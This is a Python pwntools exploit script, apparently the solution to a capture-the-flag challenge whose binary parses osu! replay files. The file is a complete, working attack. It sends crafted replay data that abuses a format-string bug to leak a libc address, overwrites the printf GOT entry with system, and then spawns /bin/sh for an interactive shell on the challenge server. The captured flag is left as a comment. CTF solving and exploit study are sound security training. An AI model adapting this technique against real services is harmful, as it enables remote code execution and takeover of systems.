#!/usr/bin/env python3

from pwn import *
from time import sleep
import leb128

exe = ELF("./analyzer_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

REMOTE_NC_CMD    = "nc chal.osugaming.lol 7273"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    #https://osu.ppy.sh/wiki/en/Client/File_formats/osr_%28file_format%29
    def construct_string(value):
        return b"\x0b" + leb128.u.encode(len(value)) + value


    fmt = b"%15$sAAA" + p64(exe.got.puts)
    payload = b"\x00" + p32(0x20) + construct_string(b"aa") + construct_string(fmt) + construct_string(b"aa") + p16(0x20)*6
    r.sendline(payload.hex())

    r.recvuntil(b"Player name: ")
    leak=u64(r.recvuntil(b"AAA")[:-3].ljust(8, b"\x00"))
    libc.address = leak - libc.sym.puts

    fmt = fmtstr_payload(14, {exe.got.printf:libc.sym.system})
    payload = b"\x00" + p32(0x20) + construct_string(b"aa") + construct_string(fmt) + construct_string(b"aa") + p16(0x20)*6
    r.sendline(payload.hex())

    payload = b"\x00" + p32(0x20) + construct_string(b"aa") + construct_string(b"/bin/sh") + construct_string(b"aa") + p16(0x20)*6
    r.sendline(payload.hex())

    r.interactive()
    #osu{1_h4te_c!!!!!!!!}

if __name__ == "__main__":
    main()